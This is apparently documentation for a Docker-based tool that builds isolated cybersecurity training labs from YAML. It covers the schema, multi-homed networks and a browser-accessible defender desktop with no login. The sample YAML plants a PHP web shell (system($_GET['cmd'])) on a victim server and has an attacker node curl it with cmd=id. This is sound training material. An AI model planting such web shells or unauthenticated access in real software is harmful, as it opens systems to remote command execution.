# Lab on Demand: Scenario Configuration & Architecture Blueprint

Welcome to the definitive configuration and architectural guide for **Lab On Demand** (`labod`). This documentation details how to construct, customize, and deploy multi-homed, completely isolated cybersecurity lab environments using a single declarative YAML profile.

---

## 1. Architectural Architecture & Core Foundations

The control plane orchestrates local Docker resources by abstracting low-level container networks and image layering states into clean configurations. To maximize lab utility while ensuring structural stability, the orchestrator adheres to three core design concepts:

### A. Global Labeling & Teardown Profiles
Every asset provisioned by the platform (networks, standard containers, custom workspaces, and temporary image layers) is stamped with metadata labels defined in `config.py`:
* `managed_by=labod`
* `scenario=<scenario_slug>` (where the slugified name is generated via `scenario_name.lower().replace(" ", "_")`)

When executing a teardown command via `main.py`, the engine operates in two specific modes:
* **Surgical Mode (`labod decommission <config_path>`)**: Parses the target YAML file to compute the specific `scenario_slug` and drops matching containers, networks, and custom images.
* **Global Nuke Mode (`labod decommission`)**: Bypasses local configuration files entirely. It queries the active Docker daemon and issues a global engine filter sweep matching `managed_by=labod` to wipe all active assets instantly, ensuring zero persistent disk or memory leakage.

### B. Multi-Homing Network Mechanics
Docker natively restricts network attachment to a single interface during container creation. To achieve true multi-homing (nodes sitting simultaneously across multiple subnets, such as a dual-homed firewall or an adversary targeting an internal zone), the provisioning engine uses an array slicing model:
1.  **Instantiation Interface**: The container is initialized strictly attached to the first network listed in the node configuration (`assigned_nets[0]`).
2.  **Dynamic Interface Stitching**: Once the container is running, the engine slices the remaining array (`assigned_nets[1:]`) and loops through each secondary network object, programmatically executing a downstream `.connect(container)` hook. This binds multiple independent interfaces to a single runtime environment with dedicated IP addresses inside each subnet.

### C. In-Memory Image Compilation
To eliminate namespace collisions across concurrent training sessions, custom images compiled via `build_modifiers` are tagged using a scoped naming schema: `labod/<scenario_slug>-<node_name>`. The engine constructs these layers in-memory using an ephemeral virtual byte-stream (`io.BytesIO`), bypassing heavy local build directories and preserving disk health.

---

## 2. Complete YAML Schema Specification

The entire lifecycle of a lab scenario is governed by a single YAML file. Below is the comprehensive data definition for every key and option supported by the parsing engine.

### A. Top-Level Elements
| Key | Data Type | Requirement | Range / Permitted Values | Default Value | Functional Impact |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `scenario` | `String` | Optional | Alphanumeric, spaces, underscores, hyphens | `"unnamed_scenario"` + random int | Defines the baseline identifier for the lab environment. Transformed into a lowercase snake_case token (`scenario_slug`) to tag and isolate all network namespaces and container clusters. |
| `networks` | `List[Block]` | Required | A list containing individual network definition blocks | N/A | Declares the custom isolated virtual subnets that form the topology of the training range. |
| `nodes` | `List[Block]` | Optional | A list containing individual infrastructure/victim node blocks | N/A | Defines standard servers, target environments, misconfigured hosts, or secondary assets within the range. |
| `defender_workspace` | `Block` | Optional | A single specialized node structure | N/A | Spins up the interactive visual workstation for analysts. Automatically injects administrative networking capabilities and maps a secure browser-accessible graphics pipeline to the host. |
| `attacker_node` | `Block` | Optional | A single specialized node structure | N/A | Deploys an offensive emulation system. Automatically delayed during launch sequences to ensure victim systems have completed initialization. |

---

### B. Network Definition Block (`networks`)
Each item in the `networks` list configures an isolated virtual layer-2 domain.

| Key | Data Type | Requirement | Range / Permitted Values | Default Value | Functional Impact |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `name` | `String` | Required | Unique alphanumeric identifier (no spaces) | N/A | The local identifier used by nodes to reference this subnet. Appended to the scenario slug to form the true system network name: `{scenario_slug}_network_{name}`. |
| `driver` | `String` | Optional | `"bridge"`, `"overlay"`, `"macvlan"` | `"bridge"` | Specifies the Docker network subsystem backing the topology. |
| `internal` | `Boolean` | Optional | `true` or `false` | `false` | When set to `true`, completely disconnects the network from the host's default external gateway, blocking ingress/egress internet traffic to isolate toxic or offline exercises. |

---

### C. Node Core Definition Block (`nodes`, `defender_workspace`, `attacker_node`)
These configuration choices apply uniformly across standard infrastructure nodes, defender workstations, and attacker machines.

| Key | Data Type | Requirement | Range / Permitted Values | Default Value | Functional Impact |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `name` | `String` | Required | Unique alphanumeric string per scenario | N/A | Sets the container name suffix. Evaluated internally as `{scenario_slug}_{name}`. |
| `base_image` | `String` | Required | Any valid Docker Hub or private registry image reference | N/A | Points to the root filesystem template for the container. Triggering images prefixed with `pinacjoshi/labod` unlocks native dynamic tool tracking. |
| `networks` | `List[String]` | Required | Must reference names declared in the `networks` root key | N/A | Binds the host to specific subnets. Listing multiple entries triggers the sequential multi-homing engine loop (`assigned_nets[1:]`). |
| `mem_limit` | `String` | Optional | Positive integer followed by `m` (Megabytes) or `g` (Gigabytes) | `"1g"` | Strict blast-radius memory ceiling preventing individual systems from exhausting host hardware (e.g., `"512m"`). |
| `cpus` | `Float` | Optional | `0.1` to maximum available host logic cores | `1.0` | Defines fractional CPU allocations. Converted to nano-CPUs (`int(cpus * 1e9)`) to throttle processing speed. *Note: Ignored on defender workspaces to prioritize graphics performance.* |
| `exec_command` | `String` | Optional | Valid Linux shell script / command sequence | N/A | Forces execution of a persistent process or routine upon container boot. Evaluated safely inside `["/bin/sh", "-c", exec_command]`. |
| `cap_add` | `List[String]` | Optional | Valid Linux Capabilities (e.g., `["NET_ADMIN", "SYS_ADMIN", "NET_RAW"]`) | `[]` | Grants advanced kernel execution privileges to the container space. |
| `cap_drop` | `List[String]` | Optional | Valid Linux Capabilities | `[]` | Strips standard container permissions to model hardened environments or enforce restriction constraints. |
| `volumes` | `List[String]` | Optional | Host/Container absolute paths or relative syntax (`./src:/target:ro`) | `[]` | Mounts local file directories into the container. Relative declarations starting with `.` are automatically resolved to raw absolute paths before execution. |
| `build_modifiers` | `Block / List`| Optional | Conditional based on `base_image` (see sub-table below) | N/A | Instructs the framework to compile a unique, scenario-specific image variant in-memory before running. |

#### Detailed Anatomy of `build_modifiers`
The internal structure of `build_modifiers` adapts automatically depending on whether the system detects a custom platform image or a generic baseline.

* **Scenario A: Image belongs to the Supported Project Suite** (Contains `pinacjoshi/labod`)
    Expects a structured dictionary with two dedicated tracking arrays:
    * `install_packages` (`List[String]`): A list of standard software packages to be fetched via native package managers. The engine automatically links these together, injects non-interactive safety arguments, cleans local caches to minimize disk space, and appends the items to the workstation splash screen.
    * `raw_instructions` (`List[String]`): A list of valid raw Dockerfile instruction strings (e.g., `["ENV VAR=VALUE", "COPY x y"]`) appended directly onto the dynamic assembly stream.
* **Scenario B: Generic Base Images** (e.g., `ubuntu:latest`, `alpine:3.19`)
    Expects a flat, sequential list of raw Dockerfile string commands (`List[String]`). Providing a dictionary modifier structure on a generic image will prompt the orchestrator to throw a warning and skip modifications to avoid broken dependencies.

---

### D. Specialized Elements for `defender_workspace`
The analyst terminal includes automated configuration overrides designed for seamless browser access:

| Key | Data Type | Requirement | Range / Permitted Values | Default Value | Functional Impact |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `exposed_port` | `Integer` | Optional | `1024` to `65535` | `8080` | Specifies the starting point for host binding. The engine binds this port on local interface `127.0.0.1` and maps it to container port `3000`. If the chosen port is already in use by another application, the port scanner (`_find_available_port`) auto-increments upward up to 50 times to guarantee a collision-free launch. |

*Additional Workspace Hardening: The provisioner automatically injects a shared memory parameter (`shm_size = "512m"`) into the visual container to prevent tab crashes during intensive packet rendering or browser actions, and auto-injects administrative network privileges (`NET_ADMIN` and `NET_RAW`) unless they are explicitly blocked in `cap_drop`.*

---

### E. Specialized Elements for `attacker_node`
The offensive node functions with a critical procedural delay:
* **Stabilization Sleep**: During execution, the main orchestrator deploys networks, standard nodes, and defender workspaces sequentially. It then pauses execution for **5 seconds** before spinning up the `attacker_node`. This architectural buffer ensures all victim listening ports, logging services, and target databases have stabilized and are fully listening before offensive routines begin.

---

## 3. Deep Dive: The Custom Defender Workspace

The foundational pillar for the security analyst's interactive experience is the custom workspace image built from the project's included `Dockerfile`.

### A. Core OS and Presentation Stack
* **Base Framework Layer**: Built directly on top of `ghcr.io/linuxserver/baseimage-kasmvnc:ubuntunoble`. This base image couples an ultra-stable Ubuntu Noble base with KasmVNC—a highly efficient web-based remote display engine that converts local X-server visuals into a high-speed HTTP transport stream over port `3000`.
* **Zero-Authentication Design**: Tailored for frictionless laboratory accessibility. Students avoid tedious login panels, multi-container access keys, or credential management; pointing a browser at the allocated host workspace port drops them directly into a graphical environment.
* **Desktop Environment**: XFCE 4. chosen specifically for its light resource footprint and modular panel structure. It is initialized cleanly using a dedicated startup controller script located at `/defaults/autostart`, which handles:
    * Forking background synchronization routines (`autocutsel`) to bridge the host OS clipboard with the isolated container environment.
    * Enforcing Firefox as the system-wide default web browser instance.
    * Spawning an borderless, clean terminal dashboard executing the native tool readout splash display.

### B. Workspace Paths and Permissions
* **Unified Path Enforcement**: The image shifts all runtime paths, variable frames, configuration settings, and desktop configurations into `/config`. The legacy unprivileged system home directories (`/home/*`) are purged during assembly.
* **User Context Mapping**: The environment operates under user profile `abc` (statically mapped to UID `1000` / GID `1000`). To prevent file access issues when mapping exercise folders across the host boundary, a finalization hook executes `chown -R 1000:1000 /config`, keeping all desktop environments write-accessible.

### C. Pre-Installed SOTA Security Toolset
The baseline image comes loaded with a curated security toolset across multiple analytical categories:
* **Packet Capture & Network Analysis**: Fully integrated installations of `wireshark`, `tshark`, `tcpdump`, and `nmap`. The image uses advanced configuration pinning (`debconf-set-selections`), configuring `wireshark-common` with raw packet injection capability (`install-setuid true`) and binding user account `abc` to the `wireshark` group structure.
* **Malware Analysis & Forensics**: `yara` (for compilation and logic matching), `binwalk` (for unpacking firmware or hidden data chunks), `strace` (for process-level system tracking), `libimage-exiftool-perl` (for metadata investigation), and native data utilities (`xxd`, `jq`, `binutils`).
* **Productivity & Automation**: Enhanced processing controls via `tmux`, native system tracking utilities (`iproute2`, `net-tools`, `iputils-ping`), and full runtime python installation (`python3-pip`).
* **Hardened Browser Controls**: Firefox is injected with a customized Enterprise Policy configuration (`/usr/lib/firefox/distribution/policies.json`). This strictly suppresses first-run welcome wizards, privacy prompts, fallback defaults, and update checks, ensuring immediate access to web targets.

### D. The Dynamic Tool Manifest Tracking Engine
To keep users informed of what tools are available, the image implements a shell tracking matrix:
1.  **Static Validation Check**: Upon logging into the desktop, `/defaults/autostart` pops open an explicit `xfce4-terminal` that executes `/usr/local/bin/labod-splash.sh`. This script checks the status of core packages, displaying a green checkmark `[✓]` for active tools.
2.  **Dynamic Expansion**: When a scenario configuration leverages the `build_modifiers.install_packages` block, the Python provisioner catches the instruction, runs the installation, and logs the package names directly into a text tracking manifest file: `/etc/labod_custom_tools.txt`.
3.  **Splash Integration**: The splash script scans this manifest file, and if it's not empty, extracts the dynamically added tools and prints them under a dedicated purple tracking header `[+] Scenario-Specific Tools`. This confirms that all tailored tools requested by the lab profile have been deployed successfully.

---

## 4. Production-Ready Sample Scenario YAML

Save the following content as a file (e.g., `enterprise_compromise.yaml`) to serve as a complete structural template for designing advanced, multi-subnet training environments.

```yaml
# =============================================================================
# SOC Lab Builder - Advanced Corporate Network Compromise Simulation
# =============================================================================
scenario: "Enterprise Compromise Architecture"

# 1. Topology Infrastructure Definitions
networks:
  - name: "dmz_zone"
    driver: "bridge"
    internal: false   # Allows public routing for mock web interaction
  - name: "internal_lan"
    driver: "bridge"
    internal: true    # Completely locked away from external host escapes

# 2. Standard Infrastructure Services & Victim Targets
nodes:
  - name: "public_web_server"
    base_image: "ubuntu:noble"
    mem_limit: "512m"
    cpus: 0.5
    networks:
      - "dmz_zone"
    # Flat list approach required for generic base images
    build_modifiers:
      - "RUN apt-get update && apt-get install -y apache2 php libapache2-mod-php"
      - "RUN echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php"
    exec_command: "apachectl -D FOREGROUND"

  - name: "internal_database"
    base_image: "alpine:3.19"
    mem_limit: "1g"
    cpus: 1.0
    networks:
      - "internal_lan" # Isolated inside the dark zone
    build_modifiers:
      - "RUN apk update && apk add mariadb mariadb-client"
      - "RUN mysql_install_db --user=mysql --datadir=/var/lib/mysql"
    exec_command: "exec mysqld --user=mysql --console"

  - name: "dual_homed_pivot"
    base_image: "ubuntu:noble"
    mem_limit: "256m"
    cpus: 0.25
    cap_add:
      - "NET_ADMIN" # Required to manipulate local IP forwarding rules
    networks:
      - "dmz_zone"     # First element: Root container initialization interface
      - "internal_lan" # Sliced entry: Dynamic engine binds this secondary wire
    exec_command: "sysctl -w net.ipv4.ip_forward=1 && tail -f /dev/null"

# 3. Security Analyst Remote Desktop Environment
defender_workspace:
  name: "incident_responder_desktop"
  base_image: "pinacjoshi/labod-defender-base:latest"
  mem_limit: "2g" # Higher memory allocation to support visual rendering and analysis tools
  exposed_port: 8080 # Visually accessible via browser at [http://127.0.0.1:8080](http://127.0.0.1:8080)
  networks:
    - "dmz_zone"     # Placed directly on the DMZ wire to sniff active web exploits
    - "internal_lan" # Placed on internal network to investigate lateral movement
  # Structured dictionary modifier block allowed strictly for platform images
  build_modifiers:
    install_packages:
      - "zeek"
      - "suricata"
      - "radare2"
    raw_instructions:
      - "ENV EXERCISE_PHASE='IR-TRIAGE-01'"
      - "RUN mkdir -p /config/Desktop/Evidence_Vault"

# 4. Adversary Automation Engine (Delayed 5-Second Initialization)
attacker_node:
  name: "adversary_c2_node"
  base_image: "ubuntu:noble"
  mem_limit: "512m"
  cpus: 0.5
  networks:
    - "dmz_zone" # Attacker targets the external facing DMZ surface first
  build_modifiers:
    - "RUN apt-get update && apt-get install -y curl nmap python3"
  # Automated exploitation routine executing after the stabilization sleep window
  exec_command: |
    python3 -c "
    import time, subprocess
    print('[*] C2 framework active. Sleeping for stabilization...');
    time.sleep(2);
    print('[+] Initiating breach against public service...');
    subprocess.run(['curl', '-g', 'http://enterprise_compromise_architecture_public_web_server/shell.php?cmd=id']);
    "